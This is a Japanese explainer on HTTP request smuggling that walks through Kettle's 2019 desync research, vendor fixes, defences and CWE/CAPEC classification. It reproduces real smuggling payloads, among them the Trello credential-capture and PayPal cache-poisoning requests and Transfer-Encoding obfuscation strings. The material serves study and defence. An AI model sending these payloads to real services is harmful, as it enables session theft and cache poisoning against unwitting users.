## (a) HTTP Desync Attacks: Request Smuggling Reborn（2019）

2019年8月、PortSwigger の James Kettle（研究部門ディレクター、ハンドル名 albinowax）が発表した "HTTP Desync Attacks: Request Smuggling Reborn" は、2005年に Watchfire の論文で理論化されながらも長らく「実務では枯れた古典」と見なされていた HTTP リクエストスマグリング（HTTP Request Smuggling）を、現代的な検出手法・攻撃手法・防御論として再構築した研究である。本節ではこの論文と、その続報 "What happened next" を軸に、なぜこの攻撃が成立するのかを仕組みレベルで解説する。

> ⚠️ 本節は防御・検出の理解を目的とする。ここで示すペイロードやリクエスト例は、脆弱性の原理を説明するための最小例であり、**実在サービスや本番環境に対する無許可の検証には使用しない**こと。検証は自分が管理する、または明示的な許可を得たラボ環境に限る。

### 核心概念:「リクエストは嘘をつく（The request is a lie）」

現代の Web サイトの多くは、単一のサーバーで完結していない。ユーザーとバックエンドの間には、**フロントエンド**（front-end。CDN、ロードバランサ、リバースプロキシ、WAF など、最初にリクエストを受ける中継サーバー）が置かれ、フロントエンドが受けたリクエストをバックエンド（back-end。実際にアプリのロジックを処理するサーバー）へ転送する構成が一般的である。

このとき性能上の理由から、フロントエンドとバックエンドの間の TCP/TLS コネクションは**使い回される（connection reuse / keep-alive）**。つまり一本のコネクションの上に、複数のユーザーのリクエストが次々と流し込まれる。ここに攻撃の土台がある。

HTTP/1.1 では「1本のバイトストリームのどこまでが1つ目のリクエストで、どこからが2つ目か」という**メッセージ境界（message boundary）**を、リクエストヘッダの記述だけで決める。フロントエンドとバックエンドがこの境界を**別々に解釈**すると、両者の間で「いま何リクエスト目を処理しているか」の同期がずれる。この同期のずれを **desync（デシンク、非同期化）** と呼ぶ。

Kettle の言葉を借りれば、攻撃者は「2つの異なる HTTP リクエストとして解釈されうる曖昧なメッセージ（ambiguous message）」を送り込む。フロントエンドは1つのリクエストとして扱って転送するが、バックエンドはそれを2つに割る。すると割られた「2つ目」の断片が、バックエンド側のコネクション上に**居残る（socket poisoning、ソケット汚染）**。そして次に同じコネクションを流れてくる**別の無関係な被害者のリクエスト**の先頭に、攻撃者が仕込んだ断片が**接頭辞（prefix）**として連結される。

これが "the request is a lie"（そのリクエストは嘘をついている）というスローガンの意味である。ネットワーク中継機器はヘッダに書かれた長さを信じて処理するが、その長さの記述自体が意図的に矛盾させられており、機器ごとに違う「真実」を信じてしまう。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### なぜ境界がずれるのか:Content-Length と Transfer-Encoding

HTTP/1.1 でボディの長さ（＝リクエストの終端）を示す方法は2つある。

- **Content-Length（CL）**: ボディのバイト数を10進数で明示する。例 `Content-Length: 15` なら、ヘッダ直後の15バイトがボディ。
- **Transfer-Encoding: chunked（TE）**: ボディを「チャンク」に分割して送る。各チャンクは「そのチャンクのバイト数を16進数で書いた行」＋CRLF＋「そのバイト数ぶんのデータ」＋CRLF で構成され、**サイズ 0 のチャンク**（`0\r\n\r\n`）が来たら本文終了、という約束になっている。

問題は、**両方のヘッダが同時に付いていた場合**の扱いである。RFC 7230 は明確に「Transfer-Encoding と Content-Length の両方を含むメッセージを受け取った場合、Content-Length は無視しなければならない（MUST be ignored）」と定めている。しかし現実には、多くのサーバーがこのルールを守らず、しかも守り方（あるいは破り方）がサーバーごとにバラバラである。ある機器は CL を優先し、別の機器は TE を優先する。この「優先順位の食い違い」こそが desync の直接原因になる。

チャンク方式の終端が `0\r\n\r\n` という**データ自身の中身**で決まる点が重要だ。CL のように「あと N バイト」と外形的に決まるのではなく、ストリームを読み進めて初めて終端がわかる。だからフロントエンドが CL を信じて「ここまで」と切ったバイト列の**続き**に、バックエンドは chunked のルールで「まだ次のリクエストがある」と読み進める余地が生まれる。

以下、代表的な3類型を見る。

#### CL.TE:フロントは Content-Length、バックは Transfer-Encoding

フロントエンドが CL を優先し、バックエンドが TE を優先するケース。論文の検出用リクエスト例:

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

**なぜこうなるか。** フロントエンドは `Content-Length: 4` を信じる。ヘッダ直後のボディは `1\r\nZ\r\n` のうち先頭4バイト（`1`, CR, LF, `Z`）ちょうどでリクエストが終わると判断し、そこまでをバックエンドへ転送する。一方バックエンドは `Transfer-Encoding: chunked` を優先するので、`1\r\n` を「これから1バイトのチャンクが来る」と読み、`Z` を受け取る。次に**チャンクの区切りとして次のチャンクサイズ行を待つ**が、そこにあるはずの `Q` はまだフロントエンドから送られてこない（フロントは4バイトで切ったため）。結果、バックエンドは「次のチャンクサイズ」を待って**タイムアウトするまでブロックする**。

この「バックエンドだけが待ち続けて応答が遅れる」現象が、**副作用のないタイミングベース検出（timing-based detection）**の核心である。被害者のリクエストを実際に壊すことなく、応答遅延の有無だけで CL.TE の存在を推定できる。

#### TE.CL:フロントは Transfer-Encoding、バックは Content-Length

逆に、フロントが TE、バックが CL を優先するケース。検出例:

```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0
X
```

**なぜこうなるか。** フロントエンドは chunked を優先し、`0\r\n` を見て「サイズ0のチャンク＝本文終了」と判断する。つまり `0\r\n\r\n` までで転送を打ち切り、後続の `X` は送らない（あるいは次リクエストの一部として扱う）。バックエンドは `Content-Length: 6` を信じているので、ボディを6バイト（`0`, CR, LF, `X`, さらに続く2バイト…）受け取ろうとするが、フロントが `X` の手前で止めているため**6バイトに満たない**。よってバックエンドは残りのバイトを待ってタイムアウトする。

CL.TE とはタイムアウトを起こす仕掛けが左右逆になっている点に注目してほしい。検出時は両パターンを試し、どちらで遅延が出るかで desync の向きを判定する。

#### TE.TE:双方が chunked を解釈するが、解釈が食い違う

フロントもバックも Transfer-Encoding を解釈するものの、片方だけがヘッダを「無効化」してしまうよう仕向ける類型。攻撃者は Transfer-Encoding ヘッダをわざと**難読化（obfuscation）**し、片方のパーサには「これは TE だ」と認識させ、もう片方には「壊れた／未知のヘッダだから無視」と扱わせる。論文が挙げる難読化バリエーション:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked      ← コロンの前にスペース
Transfer-Encoding:[tab]chunked   ← 値の前がタブ文字
Transfer-Encoding
 : chunked                        ← 行折り返し（後の続報で $16,500 の報奨につながる)
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: chunked        ← 実体は正しい行と難読化行を並べ、片方だけ効かせる
Transfer-Encoding: x
```

**なぜこうなるか。** HTTP パーサの実装は、規格の隙間で挙動が分かれる。たとえば「コロンの前にスペース」を厳密に不正として拒否するパーサもあれば、寛容に読み飛ばして `Transfer-Encoding` として受理するパーサもある。タブ文字・先頭のヌルバイト・大文字小文字・前方一致など、実装ごとの「甘さ」の差を突いて、**同一のバイト列を2台に別々に解釈させる**。TE.TE は要するに CL.TE か TE.CL のどちらかに落とし込むための「TE を片側で殺す」テクニックの集合である。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 検出から確証へ:Detect → Confirm → Explore → Attack

Kettle の方法論は4段階からなる。

1. **Detect（検出）**: 上記のタイミングベース検出。応答遅延の有無で desync の有無と向きを、被害者に影響を与えずに推定する。
2. **Confirm（確証）**: 実際に「汚染リクエスト」を送り、続けて**自分自身の**通常リクエストを同じエンドポイントへ送る。汚染が効いていれば、続く自分のリクエストが不自然な応答（本来 200 のはずが 404 など）を返す。これでソケット汚染を再現性をもって確認する。
3. **Explore（探索）**: 内部ヘッダの漏洩などで環境を調べる。
4. **Attack（攻撃／影響実証）**: ストレージ機能を悪用した被害者リクエストの捕捉、キャッシュ汚染など。

確証段階の CL.TE ペイロード例（論文より）:

```
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: zchunked

17
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: b
```

**なぜこうなるか。** `Transfer-Encoding: zchunked` は TE.TE 難読化で、フロントには無効ヘッダと見せて CL を使わせ（53バイトで区切らせ）、バックには chunked として効かせる。バックは `17`（16進で23バイト）のチャンク `=x&q=smuggling&x=` を読み、次に `0\r\n\r\n` で本文終了とみなす。その**後ろに残った** `GET /404 HTTP/1.1\r\nFoo: b` がバックエンドのソケットに居残り、次に来る被害者リクエスト（例:別ユーザーの `POST /search ...`）の先頭に連結される。連結後は `Foo: bPOST /search ...` のような形になり、被害者は狙った通り 404 応答などを受け取る——これが汚染が効いた証拠になる。

#### 内部ヘッダの漏洩

反射（reflection。入力値をそのまま応答に出す挙動）のあるエンドポイントを使い、Content-Length を長めに設定して被害者リクエストの続きを「巻き込んで」反射させると、フロントエンドがバックエンドへ追加する内部ヘッダ（`X-Forwarded-For`、`X-Forwarded-Proto` など、プロキシが付与する送信元情報）を丸ごと読み出せる。論文では New Relic に対し、この手法で内部専用ヘッダを発見し、それを悪用して**内部 API への完全な管理者権限アクセス**にまで至った事例が示されている（F5 ゲートウェイが該当し、後述の F5 アドバイザリにつながった）。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 攻撃インパクト:何が起きるのか

リクエストスマグリングの怖さは、単一の脆弱性でありながら派生する影響が広いことにある。

#### フロントエンドの防御を迂回する

WAF やアクセス制御はフロントエンドに置かれることが多い。スマグリングで「フロントを1リクエストとして通過させ、バック側で別リクエストに割る」と、割られた2つ目のリクエストは**フロントの検査を素通り**する。これにより本来ブロックされる内部エンドポイントやバックエンド API に到達できる。

#### 他人のリクエストを捕捉する（クレデンシャル窃取）

保存機能（掲示板の投稿、プロフィール更新など、入力を保存し後で表示する機能）を悪用する。攻撃者は被害者リクエストの先頭に「これを保存せよ」という接頭辞を仕込む。被害者の Cookie や認証ヘッダを含んだリクエスト全体がアプリに保存され、攻撃者が後からそれを読み出す。論文の Trello の例:

```
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

9f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

x=x&csrf=1234&username=testzzz&bio=cake
0
```

**なぜこうなるか。** タブ難読化した TE でバック側だけ chunked を効かせ、被害者のリクエストを `bio`（自己紹介欄）という保存フィールドの値として巻き込む。Content-Length を大きく（400）取ることで、被害者リクエストの続き——認証済み Cookie を含む部分——まで `bio` の中に取り込ませ、攻撃者は被害者のプロフィールを見るだけでそのセッション情報を回収できる。

#### 反射型 XSS を「大量配信型」に格上げする

通常の反射型 XSS は、被害者に細工リンクを踏ませる必要がある。しかしスマグリングを使うと、攻撃者が仕込んだ XSS を含む応答を、**いま普通にサイトを閲覧しているランダムな利用者**に配信できる。ユーザー操作を要さない大量搾取（mass-exploitation）が成立し、深刻度が大きく跳ね上がる。

#### Web キャッシュ汚染（Web Cache Poisoning）

スマグリングで汚染した応答を、CDN/キャッシュが「正規のリソースへの応答」として保存すると、以後**全ユーザー**に汚染応答が配られる。論文の代表事例は PayPal で、`c.paypal.com` 上の JavaScript ファイル `.../fb-all-prod.pp2.min.js` を乗っ取った:

```
POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /webstatic HTTP/1.1
Host: skeletonscribe.net?
X: X
```

**なぜこうなるか。** 汚染応答が本物のログインページ用 JS のキャッシュキーに紐づけて保存されると、ログインしようとする全ユーザーが攻撃者の制御下の JS を実行してしまう。論文ではこれを DOM ベースのオープンリダイレクトや CSP 迂回と連鎖させ、平文パスワードの窃取に至った。この報告に対し PayPal は初報で **$18,900**、行折り返しヘッダを使った回避策（bypass）の発見に対しさらに **$20,000** を支払った。

#### Web キャッシュ・デセプション++

被害者の Cookie 付きでサーバーに機微データを取得させ、その応答を静的リソースのキャッシュに書かせる変種。攻撃者は無操作の被害者のアカウント情報を、後からキャッシュ経由で取得できる。

論文全体で報告された報奨総額は **7万ドル超**とされる。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### ツール:HTTP Request Smuggler と Turbo Intruder

この研究の実務的インパクトを支えたのが、公開されたオープンソースツール群である。

- **HTTP Request Smuggler**（Burp Suite 拡張）: 上記のタイミング検出、TE.TE 難読化バリエーションの総当たり、確証手順を自動化する。「最小の巻き添えリスク（minimal risk of collateral damage）」で検出できることを重視した設計。
- **Turbo Intruder**: 高速・高並列にリクエストを送るツールで、コネクション使い回しの挙動観察やタイミング計測に使う。

検出・確証を安全に回すための実務上の注意点として、論文および続報は次を挙げる。

- **多くの Web テストツールは Content-Length を自動修正してしまう**ため、スマグリングは送れない。Burp Repeater では「Content-Length を自動更新しない」オプションを無効化して手動制御する必要がある。
- Turbo Intruder では `requestsPerConnection = 1` に設定し、汚染リクエストと被害者役リクエストを対にして送る。
- ホスト名解決やSOCKSプロキシ経由の別IPからのアクセスで、フロントエンドが複数台あるか・コネクション使い回しが本当に起きるかを確認する。

> 出典: HTTP Desync Attacks: Request Smuggling Reborn — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### 続報「What happened next」:ベンダ対応と新バリアント

初報後の続報 "HTTP Desync Attacks: what happened next" では、影響範囲の広さとベンダ各社の対応、そして新たな難読化手法が報告された。バージョン・時期依存の情報なので、修正状況を明記する。

**ベンダ対応（2019年〜）**

- **Akamai**: 公表から約48時間でホットフィックスを展開。RFC 7230 準拠（chunked の Transfer-Encoding を優先）に寄せ、同社配下の多数のサイトを保護。
- **F5**: アドバイザリ **K50375550**（2019年8月25日）を発行。BIG-IP に対しプロトコル準拠の強制を最も確実な緩和策として推奨。
- **HAProxy**: バージョン **2.0.6** で修正（垂直タブ〔vertical tab〕を使う難読化を正規化できていなかった点への対処）。
- **Golang**: `net/http` ライブラリの脆弱性として **CVE-2019-16276** を採番・修正。

**新たな難読化・検出手法**

- **Transfer-Encoding 値の前方一致の甘さ**: あるパーサ（例として Suricata）は、`chu` のような**途中までの値でも chunked と解釈**してしまう。更新版 HTTP Request Smuggler の "lazygrep" 技法はこの甘さを突く。
- **ヌルバイト注入**: `Transfer-Encoding: \x00chunked`。
- **余分なキャリッジリターン（superfluous CR）**: `Foo: bar\r\n\rTransfer-Encoding: chunked` のように、行の途中に単独の CR を混ぜて片側のパーサだけヘッダ境界を誤認させる。この手法は **$16,500** の報奨につながり、広範な脆弱性を露呈させた。

**ツール改良（v1.02）**: 「Only report exploitable（実際に悪用可能なものだけ報告）」で誤検出を削減、「Risky mode」で精度向上（ただしリクエストが落ちる可能性あり）、CL.TE の所見にトリアージ高速化用の追加リクエストを添付、など。

> 出典: HTTP Desync Attacks: what happened next — https://portswigger.net/research/http-desync-attacks-what-happened-next

### 防御:何をすればスマグリングは止まるのか

論文が示す防御は、いずれも「フロントとバックの解釈を一致させる／曖昧さを排除する」という一点に収斂する。

- **曖昧なリクエストの正規化（normalize）**: フロントエンドが、転送前に矛盾したリクエストを一意な形へ整える。Cloudflare や Fastly はこの正規化に成功している例として挙げられる。
- **曖昧なリクエストの拒否とコネクション切断**: バックエンドは CL と TE が両立するリクエストや、難読化された TE を**拒否し、そのコネクションを落とす**。PayPal の対策は、Akamai 側で `Transfer-Encoding: chunked` を含むリクエストを一律拒否する構成だった。
- **チェーン全体で同一のサーバーソフト・同一設定を使う**: 解釈の食い違いそのものを無くす。
- **バックエンド・コネクションの使い回しを無効化する**: 汚染断片が次のリクエストに連結される前提を崩す（性能とのトレードオフあり）。
- **バックエンド通信を HTTP/2 に統一する**: 後の研究（HTTP/2 の悪用）で完全な万能薬ではないと判明するが、HTTP/2 のバイナリフレーミングはメッセージ長を明示的に扱うため、HTTP/1.1 の CL/TE 曖昧性の多くを構造的に排除する。

**評価・検証時の注意**: Squid などの監視プロキシがスマグリングを途中で「矯正」してしまい、テストの網羅性を下げることがある。評価環境そのものが結果を歪め得る点に留意する。

> 出典: HTTP Desync Attacks: what happened next — https://portswigger.net/research/http-desync-attacks-what-happened-next

### 位置づけ:過去の系譜との接続（CWE/CAPEC）

> ⚠️ **未取得の資料**: 「HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques（CWE Program, Medium）」は自動取得できませんでした（理由: HTTP 403 Forbidden。Medium の bot 遮断による）。以下のURLからご自身で直接ご覧ください: https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1

（以下は未取得資料の補足として一般知識および検索結果に基づく解説です。）

CWE Program によるこの解説記事は、Kettle の2019年研究を「新発明」ではなく**既存の攻撃系譜の再興（redux / reborn）**として位置づける点に価値がある。HTTP Desync は「HTTP チェーン上の各エージェントが、連続する HTTP メッセージの長さ・境界の解釈で食い違うよう、ヘッダ・リクエストライン・ボディを操作すること」と定義され、標準的な脆弱性・攻撃の分類体系では次のように整理される。

- **CWE-444: Inconsistent Interpretation of HTTP Requests（'HTTP Request/Response Smuggling'）** — 本脆弱性クラスそのものを表す CWE 識別子。「HTTP リクエストの一貫しない解釈」という名称が、本節で述べた desync の本質（＝解釈の食い違い）をそのまま言い当てている。
- **CAPEC-33: HTTP Request Smuggling** — リクエストスマグリングの攻撃パターン。
- **CAPEC-273: HTTP Response Smuggling** — 応答側のスマグリング。
- **CAPEC-105: HTTP Request Splitting / CAPEC-34: HTTP Response Splitting** — 「スプリッティング」系。スマグリングが「境界の食い違いを突いて隠しリクエストを密輸する」のに対し、スプリッティングは主に CRLF 注入で1つのメッセージを2つに割る古典的手法で、両者は近縁だが別物である。

この分類の理解は実務上も重要だ。Kettle 研究は CAPEC-33（Request Smuggling）を現代のプロキシ／CDN 構成で復権させたものであり、2005年 Watchfire 論文（CL/TE 混在の理論化）や、それ以前の CRLF 注入によるレスポンス・スプリッティングの延長線上にある。「新しい脆弱性」ではなく「古い脆弱性が、コネクション使い回しを多用する現代アーキテクチャで再び致命的になった」というのが、この系譜整理の核心である。

> 出典: HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques（CWE Program, Medium。本文は未取得、CWE/CAPEC の公式定義に基づき補足）— https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1

### 本節のまとめ

- HTTP/1.1 のメッセージ境界は Content-Length と Transfer-Encoding で決まり、両者が矛盾したときの扱いがサーバーごとに違うことが desync の根本原因。
- フロントとバックの解釈のズレ＋コネクション使い回しにより、攻撃者の断片が**他人のリクエスト**に接頭辞として連結される（socket poisoning）。
- 類型は **CL.TE / TE.CL / TE.TE**。検出は被害者に影響を与えない**タイミングベース**で行い、Detect→Confirm→Explore→Attack と進める。
- 影響は WAF 迂回、他人のクレデンシャル窃取、反射型 XSS の大量配信化、Web キャッシュ汚染など多岐にわたる。
- 防御の本質は「解釈の一致」と「曖昧なリクエストの拒否・正規化」、そして必要に応じたバックエンド・コネクション使い回しの停止。
- この研究は CWE-444 / CAPEC-33 として体系化された古典の再興であり、現代アーキテクチャでの再評価が要点。
